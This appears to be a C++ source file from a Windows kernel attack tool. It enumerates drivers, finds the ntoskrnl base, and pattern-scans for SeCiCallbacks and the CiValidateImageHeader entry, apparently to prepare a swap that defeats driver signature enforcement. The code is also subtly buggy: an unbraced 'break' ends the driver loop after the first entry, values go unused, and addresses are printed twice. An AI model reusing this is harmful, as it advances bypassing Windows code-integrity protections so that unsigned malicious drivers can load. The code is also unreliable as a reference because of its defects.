#include "includes.h"


bool modules::EnumerateKernelModules( const std::wstring& targetModuleName )
{
    constexpr DWORD maxDrivers = { 1024 };
    LPVOID drivers[maxDrivers];
    DWORD cbNeeded = { 0 };

    // Query loaded kernel drivers
    std::printf( "[*] Enumerating Loaded Drivers...\n" );

    if ( !EnumDeviceDrivers( drivers, sizeof( drivers ), &cbNeeded ) || cbNeeded > sizeof( drivers ) ) return false;

    std::this_thread::sleep_for( std::chrono::milliseconds( 300 ) );

    int cDrivers = cbNeeded / sizeof( LPVOID );

    for ( int i = 0; i < cDrivers; ++i ) {
        TCHAR szDriverName[MAX_PATH] = { 0 };

        if ( GetDeviceDriverBaseNameW( drivers[i], szDriverName, MAX_PATH ) ) {

            if ( helpers::match_ascii_icase( szDriverName, targetModuleName.c_str() ) ) {
                globals::nt_base = drivers[i];
                return true;
            }
        } else
            std::wcerr << L"[!] Failed to get driver base name for driver at: " << drivers[i] << std::endl; break;
    }    
    return false; // Failed, just return false
}


seCiCallbacks_swap modules::get_CIValidate_ImageHeaderEntry() {

    std::wcout << ( "[*] Searching Pattern...\n" );

    if ( !modules::EnumerateKernelModules( L"ntoskrnl.exe" ) ) return seCiCallbacks_swap{ 0 };

    std::printf( "[*] Kernel Base Address 0x%p\n", globals::nt_base );

    ULONG_PTR mod_base = ( ULONG_PTR )globals::nt_base;
    uint8_t* test = ( uint8_t* )globals::nt_base;
    HMODULE usermode_load_va = LoadLibraryEx( L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES );
    DWORD64 uNtAddr = ( DWORD64 )usermode_load_va;
    void* ntoskrnl_ptr = ( void* )usermode_load_va;

    //Calculating the size of the loaded module
    MODULEINFO modinfo;
    GetModuleInformation( GetCurrentProcess(), usermode_load_va, &modinfo, sizeof( modinfo ) );
    std::printf( "[*] Image Size Retrieved: %llx\n", modinfo.SizeOfImage );

    uintptr_t ep = helpers::GetEntryPoint( usermode_load_va );
    std::printf( "[*] ntoskrnl.exe Entry Point: 0x%p\n", ep );

    unsigned char pattern[] = {
        0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00
    };

    const char* mask = "xxx????";

    DWORD64 seCiCallbacksInstr1 = helpers::find_pattern( uNtAddr, modinfo.SizeOfImage, pattern, mask, 0 );

    INT32 seCiCallbacksLeaOffset = *( INT32* )( seCiCallbacksInstr1 + 3 );

    DWORD64 nextInstructionAddr = seCiCallbacksInstr1 + 3 + 4;

    DWORD64 seCiCallbacksAddr = nextInstructionAddr + seCiCallbacksLeaOffset;

    wprintf( L"[*] seCiCallbacksInstr CiCallbacks: 0x%016llX\n", seCiCallbacksInstr1 );
    DWORD64 KernelOffset2 = 0x000000006dd87aba;

    DWORD64 KernelOffset = seCiCallbacksInstr1 - uNtAddr;
    wprintf( L"[*] Offset: 0x%016llX\n", KernelOffset );
    wprintf( L"[*] Offset: 0x%016llX\n", KernelOffset2 );

    DWORD64 kernelAddress = mod_base + KernelOffset;
    DWORD64 kernelAddress2 = mod_base + KernelOffset;
    wprintf( L"[*] Kernel Addr Offset: 0x%016llX\n", kernelAddress );
    wprintf( L"[*] Kernel Addr Offset2: 0x%016llX\n", kernelAddress );
    DWORD64 zwFlushInstructionCache = ( DWORD64 )helpers::GetProcAddress( ntoskrnl_ptr, L"ZwFlushInstructionCache" ) - uNtAddr + mod_base;

    DWORD64 ciValidateImageHeaderEntry = kernelAddress + 0x20; // Offset 0x20: Entry point of CiValidateImageHeader within ci.dll (nt!SeValidateImageHeader)

    std::printf( "[*] ciValidateImageHeaderEntry: 0x%p\n", ciValidateImageHeaderEntry );

    std::printf( "[*] zwFlushInstructionCache: 0x%p\n", zwFlushInstructionCache );

    // match the pattern first (same as before)
    DWORD64 instr_addr = helpers::find_pattern( uNtAddr, modinfo.SizeOfImage, pattern, mask, 0 );
    if ( !instr_addr ) {
        std::printf( "Pattern not found.\n" );
        return {};
    }

    // get the first LEA instruction's offset
    INT32 lea1_offset = *( INT32* )( instr_addr + 3 );
    DWORD64 lea1_target = instr_addr + 7 + lea1_offset;

    DWORD64 ciCallbacks = lea1_target - 0x20;

    std::printf( "[+] ciCallbacks: 0x%p\n", ( void* )ciCallbacks );

    // Optionally resolve more entries
    DWORD64 ciValidateImageHeaderEntry2 = *( DWORD64* )( ciCallbacks + 0x20 );
    DWORD64 ciValidateImageDataEntry2 = *( DWORD64* )( ciCallbacks + 0x28 );

    std::printf( "[*] CiValidateImageHeader: 0x%p\n", ( void* )ciValidateImageHeaderEntry );
    std::printf( "[*] CiValidateImageData:   0x%p\n", ( void* )ciValidateImageDataEntry2 );

    system( "pause" );
    return seCiCallbacks_swap{ 0 };
}

uintptr_t helpers::GetEntryPoint( HMODULE moduleBase ) {
    unsigned char* lpBase = reinterpret_cast< unsigned char* >( moduleBase );

    IMAGE_DOS_HEADER* idh = reinterpret_cast< IMAGE_DOS_HEADER* >( lpBase );
    if ( idh->e_magic != IMAGE_DOS_SIGNATURE ) return 0;

    IMAGE_NT_HEADERS64* nt = reinterpret_cast< IMAGE_NT_HEADERS64* >( lpBase + idh->e_lfanew );
    if ( nt->Signature != IMAGE_NT_SIGNATURE ) return 0;

    return reinterpret_cast< uintptr_t >( lpBase + nt->OptionalHeader.AddressOfEntryPoint );
}